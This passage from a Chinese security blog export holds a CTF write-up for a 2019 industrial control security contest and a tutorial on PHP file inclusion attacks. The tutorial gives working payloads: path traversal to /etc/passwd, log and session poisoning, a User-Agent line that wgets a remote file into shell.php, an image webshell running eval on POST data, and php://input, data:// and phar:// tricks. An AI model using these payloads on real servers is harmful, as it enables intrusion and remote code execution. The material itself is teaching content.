anZf4gwvF2BXbDes1KIAWXhdta3FxSHHWl7nNiueXNP+/jRD30b0Ft+tcr88J/7ysxi+/YwV4AMaBpTbls55js75uQ5xcpVu3uvaMZtWymFnbveKc449wWzv1SxV9rG3BfeyGI8+d6E6IrXt75VDvisjKz7z1UOMEJW3zF68un8K9E9ew6U+5bW+1UKMaAVrGbJ9vj0F58f088fH3ql96pu6NuAEvzhfmjEDCMUGdA08PXXv69/+Nj0cq8jlHrbumLZsfOdoD3wE8+cV9zzwLrS3cpqjz1LghrwUODJwBiyh0lAAK8norsJ2n3yC2Mfmkpfv2BBOQDQ9959B8pgph073iknGLi+L5+05P/2Z2+/a/S2ghA52LV7f3Hrr1eXwS7u/dmkfmla4bG4mfqnDaU3kBiDm+9YVfzbp+3Px/OBpysnN94yduLvKsaAVry4ZMeYfggi7JK+DCgrTPcDo3//3LNRkVAyoPGQMuR+X0SWxuC2rxQDRunkrx80eD5d+MPFwaviig0b9xSbNu/t/Z/NXfesNd+P/Z6/PtMehAAYcaIRyVEWIjd4Uax7tE39wGTRWo0hDIqVi8/E252QVyJyPhfs/YZ4jFIMKBBhX++HbIQu6cuAWhYfff/yF3uvCEMGNB5r8tK2YnNx21eK4Wc3LDP7QAQjPPNsuCciBvbUfYMEq0shJgKkSln36FfPmFemWvk8eP1wz+/WmX1iXDCuPja8sse7Ul67vv8IdfZk8ULV+/3a2fPNgMNUA0o0fb0fvHJd0pcBfXrGq6M+bCVcFjHIgMaDa8j9vnhwYnDbVwpl/oJtZnvExv7qtXGrzhhWrdltvu9RJ85Jzh8VIjdLl+0cdX/iPmVbgQkg5DagBPL5tjVw2bbx69+uMdv+fMqK3ivSYT/S7Ze8zRMco4pSDShZB/V+cEF3SV8G9M+PbBz1YSs1RX5ayIDGw2zO/b64+WNw21cK4cDI+2OsrPa4UEnM7hLC7K33nnL7qt4rhBh/eE7JSybHkqIFbHnUyW1AMUhWf6d/64XeK5ohnoFVm9uez99PoQVyS90cVAwnk13yvev/jlINKC7qej9HHD2r95du6MuAYijrH7ZSbOSTDGgargvzhl/GzRLrbesKgT1Gqy2i4lDXsG9pvTdBSkJMJJ6f/bo3HSu3AaVwidXfE0+FR9N+77IXzT4I/kvFSt2ZOedgnqaVhpJqQL98wujv89RvhE0cUunLgPoM33gaUGY0zHZwV7BKeXBklcznmfb45jLijIiyrlx89EvEJxFwvx8Z4Pn8vO9LS3eU0aa5YVZZ/75+ct2y3l/CqLetKwRfcASBCIMoCeYzoKkP3kSHqGXuK6InmaCwz4sbO/Re5jdZ8vLO8n4kv4/VEFswg8h95d4nXuLhaZvKz86zwUqJKOpQSAOhqMYfHnyl7IPnmmozuZ8rVmDsTfL9Mm48+OjG8n2pUoXXJTc5DShuYcsYEbQTkk9dQUERtw/0q9/EebgqGHfdvtj7rO5dKwI45TmmPzcv/uIfja56l5soA9qW/Nqm8y+yQ4r7NaC4SbjpybOigIDVV124DNgvzJVki1uGh833MCDqvhIuTjGJihtuXjHmdTGRtKRh1Nte/TN/1SGLetu62li3/k2zHaKowSDwrYBx2XQx0HXBFT8Zu1pwXdBMBM88z1/VicCQ52b5qzVhELjvcMFZ7REFN2Jd7gScWH3VB2qiPUkP8r03rn6eWT6jBQMi1WRO+6Y/v5iI/7vvXVtGpaeC4SHYrS2PGRckv9mCRduCJy5t5DSg6zfYvwmBOzGsWWs/39wnsfC7UFDH7Yu8zQqrGEyKASUX3e2HMbZLht6AMpD6wq/bxN5ETK1VC2bW1g3iEwnEhHKDVSWEKLJQ3A1zSoPFUG9bVxusAKx2zCT37UsfyGJoMuKscIYBCv+7n33StQcnQUwKb7q1PV+uEgNFFZhSwRGCHz8irC4wq5SY2AVWrlY/m7YcTD1atXp3OZmxXuOKZ8KtQ0x97ZCKPZX++5S55So1ltdef2uMJydE/Y4bFTkNqC+oM9aI4K2wCj6wCIidODCBcvv5xncWjurH/TtKMaBECrv9dL2lM/QGlFJOVttQMXBwXSlwikFoZZG6uBEp6fUdoxYkM/JQfvrz0QMwq5EY6m3raoOZqNXu0qvz5Yu1wQPomzjxm3RRQSU37Fm7n52cWa4NQ+r+rU31IDK2L1IqNBEYGML2HWNn+4h8WlYw3OPW330iX68qYk6lGlx81uuahDGKcQuTZ+xLhWoSK6amdJAYchpQ0tisvnCdx+LuJVaKKTS/bmRF7AYk4XVg7KtT/3ulFAPKqtbthzG6S4begOI6tdoiaiFWx3pZf69E7pP7o7bhm+2FigHCzYlClEYMxR2Aud4Y6m3ragL3qC9X7NHHB1uMnYHB+hyVmGCQ7jNR4VAF9zMT9MD+nvvvIcJgYrzwiqRM7JA1wFlg5Kz2jBExHpm6LrnypXIVzThh/T1E1Qq+DfZOWbVafSC+P8YOa3+OIJtc5DSgbg5kJba3Yvn2D+zfYLlTx9wHv6O1uMHd7uK+BqUYUCbNbj9UN+uSKAOK24xSa5V8pwnw7/XXVfJV+O/HgFauJAYPfvRH/rKp/Jz1QBZ+TGZDFDq3QrRRzEPB/k/ToeHlHusD68o8SQKIOJqHmztkUIspKefOOOk/hnrbupogSMpqgyrX9KCg2pWVQ1YXkwoCZnKtGHJCUIb7edkvdI9/I9Gc54frwO3fNCHEq/Gfx4w2YASWXHvT8jIAiepNbV6bkMozb701thIWcmuc1t+b+7XJaCGrMAclGRl46QMPTZtbmue/jT89bE+8Mf4cD8j5uhU7RlbbRNJi4BlnHv9rvlVNTgPq2ysO+T5cJl1je0CqyNk2iIVw25L2ZgV9ua9DKQbUWkwRaNclUQbUpR/DV6fffu4cGRTayr5VEADgM2QhdWRxrzUFdWAAfVGoFBawcp7qiol0w0jX27IyjKHetq4mLDdJpXqA1KBgzy1kn49gE77b0AMOBgFG0fqslTiejdWkC9fsy8F1xfmOGDsX9vB89U95PnDRNsE9brWtC8PpTlyYzLr3rU8YMyKHXVj9XnSFf3+Ua27DLfmGcDtvfaP5/iBQJ+d9ntOA+rY0tiXc89ZBFYiDuNsgmMd6Jq17GdzXoRQDykH8bj8p++IxHBIGNJbrp4zde0KEyLcxZ97YkOxKv7m/fcOaoIWmA58ZVENxb3Iexhjqbetqgnwyqw0r8tgAg1ysXL07+BBtJhl8bzzk481vR+4X6zMiBqCmCR21gnG3Wm0rtZV2nPG8f0umbaDElW+1q9RmxHwrnEq4T5sGPwy4z/tAtZ+me9FXwzsm/iAXOQ2oL9o5JbDPV5GIlXsbbnAjYjvFh/talGJArSISXR+S/4E0oOSPWe+Hi6YN394AbjE3CtKHzwghBtUQeC93o59BKYZ627qa8O05E4wxnpDfG1O4mxUpe7bjZfTBd9+jEDehNVBVOvbUuWUkbxNcu+8ggBBjYrVDIbnATA6stpVCAvvY37Laoibjy1aD1SZm8pqLnAbUF5vQ9ltY+LwjuNGbYJXptmFy2xSL4L4epRhQApzcfrqOyP9AGlD2NKz3a4tixRVitUNLXrbdExbs3VkJzyjkmjGeVgCKz0Xiw21fqQnfb4VrerxhoCC/1zeQWOLgA+t0ikHg+y4ZcEJOMyJH0mqPQgvq+yZE7Ke1YbVDoZG8FFS32uO6DpmMsgpmImT10RQ4w8lAVhtfkGOX5DSgVj8oZZJ4/+/jx2SeP+tYw7aTkdzXoxQDCq5rn/sDD1VXfCANKAEC1vuRKN2EFeWFMLyxN+mPfmqX3PJdMwMKqxL28aybNLaMH7h9VGrCVwGIQW+iwD4Wbvq26OtKDOTj4dL13ffcGyGw6rbao9AzHH2rsZDf02qHQiPa3TSsSjEVtS681C471+SCZg/TaoOowjNIchpQX9pSzNGSFd4VaMOKzjoFhtq0bWOj2walGlA8D9y79b4IHMW7yGQxNIo4lEPWgPJFUl2ElRqrjONPn1u6GZuiZ1ETnEhgtYk9fQYIfLL68l0zszvr9axWSHtImWVa/aEmrI161Db5GA/wNOASD9kfJX2kydVFdDe/TayaKvzwd+uzWKH+Fr6JIAqtxkTlIKt9yCkWVjsUWl7P9wyEbmOAL9ilba/uWxfaucyIil5twUS5yGlAfWNbPaI4FF9Oqe97xSXven74/5DAzHqbSqkGFPjtyHqwJhT99GtxSBlQSvMxy/C5hkLUhC/8n1qZscRes2VACTShtmnTwN+E21+lJkjJsdogK9pzIkCpRarstCX3NwXd+Aa6NjXdw/3e90yarPYoFN/EDLVhtUGh9Hv94FsptfVBdK/VrhLeC/aBSVnrkpwG1HeMWUwd3ArKP1p9WUXpuQ+t3F1qLofgtkP9Gjo8MPSRu1+XQ8KA4t4kgrap3meomiC6z2rDnkossdfcNNDhQq5KqMVg9YWasIIEKpFrO5EhyOCb3/WvPBg0fZVWJqIBBas9isFqj9qw2qBQclx/P32EptNQn7qr4/lyGlBfjm2oO7+Oz73OvruLVWCHILbQib3bFvVj6LAFvnz/2AM32hh6A8p+BrUVrfYpasLnIglxU7ikXDOuMfLQCDF3UxiIfIwtqF1vX1cTvhqoiOpMEx32gzihwfr8yFc7UwZ0LFYbFEqO6++nD1ZOBMv49g5dMfhSozcnOQ2ozy2dYvwpKWn15e4hkpPrFs9A1DHmNwiR2xaxpeK+LiRQ0zpkgpgRjDzpSyHBaTEMtQHFYDTVzGRfjv0MqmIsG/nhycEkJ4pBNOXGtV6P6DeWfr87KwKT/ckY3PaVmuAGdA/GrTQeeXQp4Gr+wnH27+87P5DBiXsmVuyd+uj3HgCrPYrBao/asNqgUHJcf44+8KpYhRUsMRjnTM7nHrHeJwWrihMKSQlyYQVp9eUWZfAdbN+F2tKMSNtyT+Pi9+oyyn6oDeiNt9gBBCzf+bKbZospN64vPYKk9lhyfHfuKRKUcYuh3rauNqwi+Ijk92E5SowcUOsaWNnnnqX6yHEPWO1RDFZ71IbVBoWS4/pz9AHctxQetyLcXfGaiVhM3vddEB0bA/e/NdZRucp9Nppy2nOrzYBa6UldHyoxtAYUv75Vko9/CykgnHLj+vZAFyac1J6SZ+Vym5MLiislhnrbutrw5Q4ia49kIoLXwPr8yHc+ZW5yPD9WexSD1R61YbVBoeS4/hx91MGtSw5p27YQdbVzkNOAzvMUlsCdGoOv3jVBlC4TyYBanyX2kJBYhtaA+qLvQupgQsqNS1Frq01IeSsXX6msmO+O0oH1tqy8Y6i3rauNpn1QXKApKTWDpqkUXcyRTf2Q4/mx2qMYrPaoDasNCiXH9efowwdF5X11lknzybEKzWlAmfhZfRGdG/NM+iLtrUnDRDKgBA+5bVK212IYWgPqSymhYHsIKTcuxtlqQ55pLJxsb/UV8925oea4H2Oot60rBF9JQzQMZ3Gyf259dkRgxCDI8fxY7VEMVnvUhtUGhZLj+nP00QQnmbin41RixdcvOQ0o+PYuQ8dF8JWItA4R5zliwtmPrPe6avLSMa9rC+CytmU4ZLtLhtaA+maGoUnDHHNltW+CI42sNhiuHS2nV9Rhs9uXsxXz3bkFudmDjKHetq4Qmk5lIZ0o9HSc8cJXzo37alDkeH6s9igGqz1qw2qDQslx/Tn6aMMXa/Hgo3FBexa5Dah1RB4KPeWJnGkrHZAMhK6OBHTfC6WksWDg3X5iy5vGMrQG1Bd6HpJ71FTIuglmQL5UlpiDsCm8YPWBYr47ymTV23IOZAz1tnWFgEvonAv8+0TUxu3afdIPN3m8CT+4It9hyW3keH6s9igGqz1qw2qDQslx/Tn6aMMXadpU1i6U3AaUlabVH9W4QgqdEEhltaeyT1dY75diQDn70+0nJQI5hqE1oL5UCvIk28DYWW1RG74EY4KXQmY71Fz1BSOhmO/OTZym3xjqbesKhSotTfVmWRGnnIYfSkoBC1i6bKc30XqQ7uccz4/VHsVgtUdtWG1QKDmuP0cfbbDStN4j5GzMNnIbUPAdrM1h6k2wQPCNTV2u5Kz3SzGgnGHr9kPAY5cMrQE95Rw7/5PI1CY4ysw3eKK2FAaiunwHclMqbv4Cv8Eg+KatzGDMd+fWeOUA4hjqbeuKgTq8Vh91XT5pSbFmbdxeBJGATW2qgAlW4ZzRGlIwm1UzM1JfST9qJePCGhQ5nh+rPYrBao/asNqgUHJcf2ofbDGEBNY0eVpynPLRhQH1ndLDuOWb0LKtRLSu1Q6DHBOEFIv1nikGlLHbHdtvvyu+TnkMQ2tAfYWo+QI5WNWFL5cZoy8goFKIC5hoNKttJdyAuGnJDyXdZtGL28ui123vjWK+O3evwgozb6Letq4YeLBuuNkusu+KyQN7MUQ34m5hQkFwAMaS2qS4yqbcvqo47rSDK2uK9/twD4NmT5tTTFgtMEmiT4pK8/1TwQR324meA5grWXU+uyTH82O1RzFY7VEbVhsUSo7rT+mDe/aIo2eVk3Aq1/gS7ZlM+Vz9bJe0TbZD6MKAcn1nn28HWeIxoi50tZ/Ja5kINJW47KqMYYX1nqml/Phd6v1MujbujORYhtaAMjA2rSQvuHhxeZgqxdaZhRx1YlilkZB9Akrq+Q4iDtWZ59k3eOh3x43vroRDj8GqqLetKxYGEo5Ts/rqRxhcH9feNLZQdD+6cvLS8jsdJDmeH6s9isFqj9qw2qBQclx/Sh94NuqvZRxh8kmwEEUHSJeggpkvUBER8ZmDLgwoMIGk8IHVN+KaqcblC6asxIS2a6z3TTWgZ5w72n2Nh6pLhtaAgltIIFTcNL5jkELPhSTqtlopxYo9WF8xAmaHITA7dttyTTG47SulwlmKMYdZt4lAMUovumDo3JlmP7ps0pLgwtc5yfH8WO1RDFZ71IbVBoWS4/pT+rDOrYwRxeVzrD6hKwMKeOJ8200hYhGScpZoLNZ7pxpQt871MSfP6f2lG4bagPLj+g7U9Yl9LlwWCxbZaRjM3ELh+LRLr15i9mOJWR8PLwbAZ0BDN70x4G7bmHMUwW1fqR/4/nyl/lL00tKxwQt8702rg1DhzuIeyzUYxpLj+bHaoxis9qgNqw0KJcf1p/TRj/eInO+cx/Z1aUCB7ZKQrSNXjGsp54imYL1/qgF1gzyJd+iSoTaggBFlJdrkzq1E8QIq8gMDvfUa9itjISey6YBe8kQJpKkn9foM6LQnNvde0QzX4bYNzfWqcNtXygH7JrhFU1ekzJyZ6fvOY8SIPjByf/gGoCbh2sIFnHLMU05yPD9WexSD1R61YbVBoeS4/pQ+MCqxRpToVFI8crv5uzagQOBj6IlVLDC6uM4mrM+RakAZc+r9YBe6pC8DyiDJjeoqdtM5Rz8EpLB3wV4G0anMuqgNy+Y4Je/clSWzK+s9+znTklUhEaFEpjK449JcsHi7GaTgK0VoBUBZWJV0Lrkyrualdf0oJ7hg+U7Yh8ZbwKkXBD9VriUmF/xOJ501v5z13n3v2vL1GMgQeNBJXXp42qZy9klgCOkz1YQKA467lwGE/ZyZc7Z2lhAeS4773mqPYrDaozasNiiUHNffTx9Mzij/xn1Hgfhqz5CtA+4h9tPYFiGyvitXJqf1WJ+/C/hOeAZ41qprZZzk2tnzJUJ9UKvOOtb1N2UzNHGCEyhIwZou6cuAinSIDqv/0JVWRYTGuzlbPBScjyqEEB80WGnXx0NEClKXyICOE5brhplvzP7K5OvHFnXgINyJssISQohBgPfPOhvad0B+LmRAxwH2Qt0fGpGnGAOHhFv9HHbkc+UKF9c17lAhhDjUeOzJzWV1JaLorZQdtodyHn5uIQM6DpCv6f7YiOIQsfhOoa/EyQpCCHGo0ZZGeO/UblefIAM6YNiot35sROWiWAhuuOZGf1EBGVAhxKGIz4CyFcbKdBCRxDKgiVAyjvM4if4NgVzDh6Zt9KbbpJwpWocC6Rxv5tbHlQEVQhyKuAaUoMrrp6zoK5MiFhnQROp5n6TO3Dd1fbFw8fbS506VIIozE8zDgbwYzqYi8iT0p6w+LZh1UU2J/las2lVs2jKxz+UUQogUKMlIURxSFHe/OT7ZBzKgCZDXGVK4IVS56moKIYQYHDKgCVDJxDKEKaLgghBCiOFDBjQBcossYxgj/PXzXlCKiRBCDCsyoIlwQjvlrz50uH04s0/Hnjq3DEAa5MHNQggh8iMD2icH3n2/WLlqd1kE/tY7VxdXTV5a1nw9/6JF5X8paECR96dnvDruxcuFEELkQwZUCCGESEAGVAghhEhABlQIIYRIQAZUCCGESEAGVAghhEhABlQIIYRIQAZUCCGESEAGVAghhEhABlQIIYRIQAZUCCGESEAGVAghhEhABlQIIYRIQAZUCCGESEAGVAghhIimKP4XBcAIzFfvoBoAAAAASUVORK5CYII= 解密得到图片 1.3.工业协议分析2题目：在进行工业企业检查评估工作中，发现了疑似感染恶意软件的上位机。现已提取出上位机通信流量，尝试分析出异常点，获取FLAG。 附件下载：1.3.工业协议分析2 wireshark打开后直接审计出的，你会发现好多包里都有这串16进制的数。 copy，我们去转换字符，得到flag{7FoM2StkhePz}，提交格式：7FoM2StkhePz 1.4.组态软件安全分析题目：一些组态软件中进行会配置连接很多PLC设备信息。我们在SCADA 工程中写入了flag字段，请获取该工程flag 附件下载：1.4.组态软件安全分析 首先下载附件得到test.PCZ文件，直接文本打开发现是以PK开头的文件 修改后缀为zip，打开发现一个文件夹，一个xml(加密，暂时不管)，然后把文件夹拖到mac里直接使用命令搜索flag 1find . -exec cat &#123;&#125; \\; |grep -a \"flag\" 得到flag{D076-4D7E-92AC-A05ACB788292}，提交格式：D076-4D7E-92AC-A05ACB788292 1.5.工控蜜罐日志分析题目：工控安全分析人员在互联网上部署了工控仿真蜜罐，通过蜜罐可抓取并分析互联网上针对工业资产的扫描行为，将存在高危扫描行为的IP加入防火墙黑名单可有效减少工业企业对于互联网的攻击面。分析出日志中针对西门子私有通信协议扫描最多的IP，分析该扫描组织。FLAG为该IP的域名。 附件下载：1.5.工控蜜罐日志分析 解压附件到本地，得到honeypot.log。直接提取ip，去重。 1cat honeypot.log | grep -o '\\([0-9]\\&#123;1,3\\&#125;\\.\\)\\&#123;3\\&#125;[0-9]\\&#123;1,3\\&#125;'|sort -d | uniq &gt;&gt; IPFile2.txt 然后nslookup反查域名。 123456789101112131415161718192021222324252627282930313233flie = open('IPFile2.txt','r')import osip = list()count = [0 for i in range(0,600)]ip.append(flie.readline())while True: line = flie.readline() if not line: break flag = 0 for i in range(0,len(ip)): if ip[i] == line: count[i] += 1 flag = 1 if flag == 0: ip.append(line)for i in range(0,len(count)): for j in range(0,len(count)-1): if count[j] &lt; count[j+1]: temp = count[j+1] count[j+1] = count[j] count[j] = temp temp2 = ip[j+1] ip[j+1] = ip[j] ip[j] = temp2for i in range(0,30): os.system('nslookup %s'%ip[i]) 得到结果，最后测试时，成功提交flag，提交格式：scan-42.security.ipip.net 没仔细审题，后来发现是对西门子私有通信协议扫描最多的，应该直接提取扫描最多的ip，这样最终就容易判断flag了。 1.6.隐信道数据安全分析 [未解决]题目：安全分析人员截获间谍发出的秘密邮件，该邮件只有一个mp3文件，安全人员怀疑间谍通过某种private的方式将信息传递出去，尝试分析该文件，获取藏在文件中的数据？ 附件下载：1.6.隐信道数据安全分析 1.7.工业网络设备逆向 [未解决]题目：这是一个工业系统中使用的路由器，系统的tddp协议存在远程代码执行漏洞。 请找出并分析tddp协议的执行过程，并回答以下问题 1.远程执行命令的消息类型为？（格式为CMD_???_???） 2.在tddp协议中第几个字节 = 什么时，可以控制发出远程执行命令的消息（FLAG格式为16进制） 附件下载：1.7.工业网络设备逆向 公告提示： 1.8.二次设备固件逆向题目：在对电力行业某二次设备进行渗透测试时，通过弱口令telnet服务获取了设备的权限，并提取出了设备固件文件，现在需要从固件中分析出其他默认硬编码密码或厂家后门口令。 附件下载：1.8.二次设备固件逆向 直接放到mac里搜索strings “pass” 命令如下 找到passWd后用ida打开找到 得到弱口令：icspwd，flag提交格式：icspwd 这题是Snake做的，上面几题也帮我不少(逃。 1.9.组态工程逆向分析 [未解决]题目：很多工业组态软件并未进行安全测试，存在很多安全隐患。请分析组态工程的文件，发现该工程的异常，并获取FLAG。 附件下载：1.9.组态工程逆向分析（未解决） 1.10.工业数据库安全分析 [未解决 ，未做]题目：InSQL是世界上第一种面向工厂的高性能的实时关系型数据库。请分析数据库源文件，获取数据库中的异常，并找到FLAG。 附件下载：1.10.工业数据库安全分析（未解决） ## 1.11.工业网络渗透测试 [场景题，未做]题目：通过VPN接入工业网络靶场场景中，探测发现工业管理网络中的Web应用，通过漏洞控制服务器权限，进而进一步针对工业网络进行渗透。远程VPN地址会通过系统消息发送，请留意。 公告消息： 1.12.SCADA系统渗透测试 [场景题，未做]题目：当你进入了企业管理网络，可以尝试进入生产管理网络，进而针对未进行安全防护的工业SCADA系统进行渗透测试。尝试发现SCADA系统并测试发现隐藏在系统服务中的Flag。需要通过VPN账号接入远程场景环境，并获取已经获取到访问生产管理网权限。 公告消息：","categories":[{"name":"ctf","slug":"ctf","permalink":"https:///login546.github.io/categories/ctf/"}],"tags":[{"name":"ices","slug":"ices","permalink":"https:///login546.github.io/tags/ices/"},{"name":"2019年工业信息安全技能大赛个人线上赛(第一场)","slug":"2019年工业信息安全技能大赛个人线上赛-第一场","permalink":"https:///login546.github.io/tags/2019年工业信息安全技能大赛个人线上赛-第一场/"}]},{"title":"渗透测试《文件包含》漏洞","slug":"渗透测试《文件包含漏洞》","date":"2019-07-25T19:50:28.000Z","updated":"2021-01-22T08:48:08.994Z","comments":true,"path":"2019/07/25/渗透测试《文件包含漏洞》/","link":"","permalink":"https:///login546.github.io/2019/07/25/渗透测试《文件包含漏洞》/","excerpt":"","text":"原理文件包含漏洞产生的原因是在通过php函数引入文件时，由于传入的文件名没有经过合理的校验，从而引发了文件的泄漏或者恶意代码的注入 php引发文件包含漏洞的四个常见函数： 1234include() 当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。include_once() 功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。require() 只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行require_once() 它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。 使用这些函数时，php内核并不在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程url、也都将作为PHP代码执行。 利用条件121、include等函数通过动态执行变量的方式引入需要包含的文件；2、用户能控制该动态变量。 文件包含分类123451、本地文件包含LFI(Local File Include)2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on allow_url_fopen = On）在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 一、本地包含包含同目录下的文件1?file=test.txt 目录遍历12?file=./../../test.txt./ 当前目录 ../ 上一级目录 包含日志123456789利用条件： 需要知道服务器日志的存储路径，且日志文件可读。很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。构造url为：`http://xxxx/&lt;?php phpinfo();?&gt;`，请求之后包含日志文件 `include(‘/var/log/apache2/access.log’)`，从而成功执行php代码 `?file=../../../../../../../../../var/log/apache/error.log` 常用日志默认路径apache+Linux日志默认路径12/etc/httpd/logs/access_log /var/log/httpd/access log nginx日志文件123nginx 日志文件在用户安装目录的logs目录下如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs也可通过其配置文件Nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log） 包含session12345678910利用条件：session文件路径已知，且其中内容部分可控。PHP默认生成的Session文件往往存放在/tmp目录下/tmp/sess_SESSIONID/var/lib/php/session/sess_SESSIONID?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell） 包含/proc/self/environ文件利用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 姿势： 1proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 ?file=../../../../../../../proc/self/environ 选择User-Agent 写代码如下： 1&lt;?system(&apos;wget http://www.yourweb.com/oneword.txt -O shell.php&apos;);?&gt; 然后提交请求。 包含临时文件123php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。 包含上传文件(图片)很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。 图片马的制作方式如下，在cmd控制台下输入： 123进入1.jph和2.php的文件目录后，执行：copy 1.jpg/b+2.php 3.jpg将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg 假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg图片代码如下： 1&lt;?fputs(fopen(\"shell.php\",\"w\"),\"&lt;?php eval($_POST['pass']);?&gt;\")?&gt; 然后访问URL：http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php 有防御的本地文件包含文件名后缀固定：在包含的文件名后加固定后缀 文件名过滤 :使用switch array限制可以包含的文件名 审计中可见这样的包含模版文件： 1234&lt;?php $file = $_GET['file']; include '/var/www/html/'.$file.'/test/test.php';?&gt; 这段代码指定了前缀和后缀：这样就很“难”直接去包含前面提到的种种文件。 %00截断能利用00截断的场景现在应该很少了 PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(\\x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。 ?file=../../../../../../../../../etc/passwd%00 文件系统获取含有换行符的文件名，会截断为../../../ect/passwd (需要 magic_quotes_gpc=off，PHP小于5.3.4有效) %00截断目录遍历：?file=../../../../../../../../../var/www/%00(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris) 路径长度截断：?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.(php版本小于5.2.8可以成功，linux需要文件名长于4096，windows需要长于256) 利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。 我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。而利用”./“的方式即可构造出超长目录字符串: 点号截断：?file=../../../../../../../../../boot.ini/………[…]…………(php版本小于5.2.8可以成功，只适用windows，点号需要长于256) 编码绕过服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。 利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 二次编码 ../ %252e%252e%252f ..\\ %252e%252e%255c ~绕过针对目录限制 ?file=~/../phpinfo这样的代码。其中~就是尝试是否可以直接跳转到当前硬盘目录。在某些环境下，可达到遍历当前文件目录 二、远程文件包含1?file=[http|https|ftp]://www.bbb.com/shell.txt（可以有三种，http、https、ftp) 有防御的远程文件包含1234&lt;?php $basePath = $_GET['path']; require_once $basePath . \"/action/m_share.php\"; ?&gt; 攻击者可以构造类似如下的攻击URL 12http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?=http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php%23 产生的原理: 12345/?path=http://localhost/test/solution.php?最终目标应用程序代码实际上执行了:require_once &quot;http://localhost/test/solution.php?/action/m_share.php&quot;;(注意，这里很巧妙，问号&quot;?&quot;后面的代码被解释成URL的querystring，这也是一种&quot;截断&quot;思想，和%00一样)攻击者可以在http://localhost/test/solution.php上模拟出相应的路径，从而使之吻合 PHP中的封装协议(伪协议)https://www.php.net/manual/zh/wrappers.php 1234567891011121314file:///var/www/html 访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLsdata:// 数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流 利用php流input：利用条件： 123allow_url_include = On。对allow_url_fopen不做要求。 构造: 12345index.php?file=php://inputPOST:&lt;? phpinfo();?&gt; 结果将在index.php所在文件下的文件shell.php内增加&lt;?php phpinfo();?&gt;一句话 利用php流filter：1?file=php://filter/convert.base64-encode/resource=index.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。 其他姿势： 1index.php?file=php://filter/convert.base64-encode/resource=index.php 效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。 利用data URIs：利用条件： 1231、php版本大于等于php5.22、allow_url_fopen = On3、allow_url_include = On 利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中 1234?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,base64编码的payloadindex.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; (需要allow_url_include=On) glob://伪协议1glob:// 查找匹配的文件路径模式 phar://利用条件： 1php版本大于等于php5.3.0 理解： 如果服务器只允许包含.php文件，后台代码为：include(xxx + &#39;.php&#39;);，而这个.php文件不可控。但是我们可以上传一个.txt文件，那么我们可以通过phar伪协议来包含这个文件，而且phar协议不以后缀名判断文件类型，所以我们将我们的test.php木马压缩以后改为a.txt文件上传到服务器上，之后可以构造payload：phar://a.txt/test，服务器拼接以后就成为了：phar://a.txt/test.php，即可成功包含 姿势： 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包 指定绝对路径 1index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt 或者使用相对路径（这里test.zip就在当前目录下） 1index.php?file=phar://test.zip/phpinfo.txt zip://利用条件： 